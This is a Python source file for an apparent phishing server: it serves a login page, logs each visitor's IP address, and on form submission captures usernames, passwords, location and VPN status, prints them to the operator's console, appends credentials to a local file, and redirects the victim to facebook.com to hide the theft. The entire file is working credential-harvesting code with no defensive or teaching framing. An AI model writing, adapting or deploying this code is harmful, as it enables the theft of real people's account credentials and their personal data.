from urllib.parse import unquote
from http.server import SimpleHTTPRequestHandler, HTTPStatus
from termcolor import colored
import socketserver
from datetime import datetime

red='red'
green='green'
yellow='yellow'

class MyHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, filepath, **kwargs):
        self.FILE_PATH = filepath
        super().__init__(*args, **kwargs)

    def log_message(self, format, *args):
        # Disable logging by doing nothing
        pass

    def get_user_info(self):
        print(colored("\nA user is visiting your web.", color=red))
        user_ip = self.client_address[0]
        print(colored("User Ip:", "red"), colored(user_ip, "yellow"))

    def do_GET(self):
      if self.path == '/':
        if not getattr(self, 'sent_response', False):
            self.send_response(HTTPStatus.OK)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open(self.FILE_PATH, 'rb') as f:
                self.wfile.write(f.read())
            self.get_user_info()
            self.sent_response = True
        elif self.path == '/favicon.ico':
            self.send_response(HTTPStatus.NO_CONTENT)
        else:
            # Serve other files using the default handler
            super().do_GET()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        post_params = dict(param.split('=') for param in post_data.split('&'))
        username = unquote(post_params.get('username', ''))
        password = unquote(post_params.get('password', ''))
        location = unquote(post_params.get('location', ''))
        vpn = unquote(post_params.get('vpn', ''))
        user_ip = self.client_address[0]
        print(colored(f"\n{user_ip} user logged in", color=green))
        print(colored(f"Username: {username}, Password: {password}", color='yellow'))
        print(colored(f"Vpn: {vpn}", color='green'))
        print(colored(f"location: \033[34m{location}\033[0m", color='yellow'))
        current_datetime = datetime.now().strftime('%Y-%m-%d %I:%M:%S')
        with open('users/users.txt', 'a') as log_file:
            log_file.write(f"{current_datetime}: {user_ip} - Username: {username}, Password: {password}\n")
        self.send_response(303)
        self.send_header('Location', 'https://facebook.com')
        self.end_headers()
        return
